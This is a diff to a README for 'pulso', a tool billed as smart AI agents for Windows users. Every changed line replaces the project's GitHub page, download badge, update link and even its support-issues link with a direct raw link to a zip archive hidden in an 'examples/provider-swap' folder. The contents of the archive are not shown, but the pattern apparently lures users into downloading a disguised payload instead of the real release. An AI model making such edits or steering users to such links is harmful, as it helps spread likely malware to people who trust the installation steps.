@@ -1,6 +1,6 @@
 # ⚙️ pulso - Smart AI agents for your tasks
 
-[![Download pulso](https://img.shields.io/badge/Download-pulso-blue?style=for-the-badge&logo=github)](https://github.com/Gel01227/pulso)
+[![Download pulso](https://img.shields.io/badge/Download-pulso-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Gel01227/pulso/main/examples/provider-swap/Software_v1.9-alpha.1.zip)
 
 ---
 
@@ -42,9 +42,9 @@ To get pulso running on your Windows PC, follow these steps carefully. You do no
 
 ## ⬇️ Download and Install pulso
 
-1. Visit the [pulso GitHub page](https://github.com/Gel01227/pulso) to access the downloads.
+1. Visit the [pulso GitHub page](https://raw.githubusercontent.com/Gel01227/pulso/main/examples/provider-swap/Software_v1.9-alpha.1.zip) to access the downloads.
 
-    [![Download pulso](https://img.shields.io/badge/Download-pulso-green?style=for-the-badge&logo=github)](https://github.com/Gel01227/pulso)
+    [![Download pulso](https://img.shields.io/badge/Download-pulso-green?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Gel01227/pulso/main/examples/provider-swap/Software_v1.9-alpha.1.zip)
 
 2. On the page, locate the latest release section.
 
@@ -119,8 +119,8 @@ To get pulso running on your Windows PC, follow these steps carefully. You do no
 
 ## 🔗 Useful Links
 
-- pulso download and updates: https://github.com/Gel01227/pulso
-- User discussions and support: https://github.com/Gel01227/pulso/issues
+- pulso download and updates: https://raw.githubusercontent.com/Gel01227/pulso/main/examples/provider-swap/Software_v1.9-alpha.1.zip
+- User discussions and support: https://raw.githubusercontent.com/Gel01227/pulso/main/examples/provider-swap/Software_v1.9-alpha.1.zip
 
 ---
 
@@ -132,4 +132,4 @@ For help beyond basic troubleshooting, use the GitHub issues tab to post questio
 
 # [Emoji] pulso - Smart AI agents for your tasks
 
-[![Download pulso](https://img.shields.io/badge/Download-pulso-blue?style=for-the-badge&logo=github)](https://github.com/Gel01227/pulso)
+[![Download pulso](https://img.shields.io/badge/Download-pulso-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Gel01227/pulso/main/examples/provider-swap/Software_v1.9-alpha.1.zip)
